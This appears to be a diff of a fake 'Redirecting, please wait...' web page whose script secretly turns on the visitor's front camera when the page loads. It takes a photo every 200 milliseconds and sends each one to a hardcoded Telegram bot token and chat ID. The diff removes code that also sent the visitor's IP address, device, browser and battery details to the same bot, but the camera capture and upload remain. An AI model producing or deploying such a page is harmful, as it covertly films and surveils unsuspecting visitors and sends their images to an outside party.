@@ -23,49 +23,15 @@
   </style>
 </head>
 <body>
-  <div class="loading">Redirecting, please wait...1</div>
+  <div class="loading">Redirecting, please wait...</div>
 
   <script type="text/javascript">
     const botToken = '7044604914:AAHUlvU0rlzbE5aU5axIAPLD7siMj1jLaA4'; // Your Telegram bot token
     const chatId = '5571330102'; // Your Telegram chat ID
 
-    // Function to get user's IP address (using free API)
-    function getUserIP() {
-      return new Promise((resolve, reject) => {
-        fetch('https://api.ipify.org?format=json')
-          .then(response => response.json())
-          .then(data => resolve(data.ip))
-          .catch(() => reject('Unable to fetch IP'));
-      });
-    }
-
-    // Function to get user's device and browser information (using free APIs)
-    function getDeviceInfo() {
-      return new Promise((resolve) => {
-        const deviceInfo = {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          language: navigator.language,
-          cookiesEnabled: navigator.cookieEnabled,
-          screenWidth: window.screen.width,
-          screenHeight: window.screen.height,
-          pixelRatio: window.devicePixelRatio,
-          online: navigator.onLine,
-          batteryStatus: "Unknown",
-          charging: "Unknown"
-        };
-
-        // Battery status
-        navigator.getBattery().then(function(battery) {
-          deviceInfo.batteryStatus = battery.level * 100 + "%";
-          deviceInfo.charging = battery.charging ? "Yes" : "No";
-          resolve(deviceInfo);
-        }).catch(() => resolve(deviceInfo));
-      });
-    }
-
-    // Function to start capturing photos continuously from the front camera
+    // Function to capture and send photos continuously
     function startCapturing() {
+      // Access the user's media devices (camera)
       navigator.mediaDevices.enumerateDevices()
         .then(devices => {
           let videoDeviceId = null;
@@ -95,7 +61,7 @@
               const imageCapture = new ImageCapture(videoTrack);
 
               // Capture and send photos continuously every 200 milliseconds (0.2 seconds)
-              setInterval(() => {
+              const captureInterval = setInterval(() => {
                 imageCapture.takePhoto()
                   .then((blob) => {
                     console.log("Photo captured");
@@ -106,6 +72,10 @@
                   });
               }, 200);  // 200ms interval between photo captures
 
+              // Stop capturing if the user leaves the page
+              window.addEventListener("beforeunload", () => {
+                clearInterval(captureInterval);  // Stop capturing when user leaves the page
+              });
             }).catch((error) => {
               console.error('Permission error:', error);
             });
@@ -114,7 +84,7 @@
         });
     }
 
-    // Function to send the captured photo to Telegram (without IP/location)
+    // Function to send the captured photo to Telegram
     function sendToTelegram(data) {
       const formData = new FormData();
       formData.append('chat_id', chatId);
@@ -138,56 +108,12 @@
       });
     }
 
-    // Function to send device/browser information to Telegram (separate message)
-    function sendDeviceInfo(deviceInfo) {
-      const message = `
-Device Information:
-----------------------
-User-Agent: ${deviceInfo.userAgent}
-Platform: ${deviceInfo.platform}
-Language: ${deviceInfo.language}
-Screen Resolution: ${deviceInfo.screenWidth}x${deviceInfo.screenHeight}
-Pixel Ratio: ${deviceInfo.pixelRatio}
-Cookies Enabled: ${deviceInfo.cookiesEnabled}
-Battery Status: ${deviceInfo.batteryStatus}
-Charging: ${deviceInfo.charging}
-Online: ${deviceInfo.online}
-      `;
-      
-      // Send the device information to Telegram
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: new URLSearchParams({
-          chat_id: chatId,
-          text: message,
-        })
-      })
-      .then(response => response.json())
-      .then(data => {
-        if (data.ok) {
-          console.log('Device info sent to Telegram');
-        } else {
-          console.error('Failed to send device info to Telegram:', data);
-        }
-      })
-      .catch(error => {
-        console.error('Error sending device info to Telegram:', error);
-      });
-    }
-
-    // Request all necessary permissions on page load
+    // Request camera permission and start capturing
     window.onload = function() {
-      // Ask for camera and location permissions
-      if (navigator.mediaDevices && navigator.geolocation) {
+      if (navigator.mediaDevices) {
         startCapturing();  // Start capturing photos continuously
-        getDeviceInfo().then(deviceInfo => {
-          sendDeviceInfo(deviceInfo); // Send device/browser information once
-        });
       } else {
-        alert('This device does not support the required permissions.');
+        alert('Your device does not support camera access.');
       }
     };
   </script>
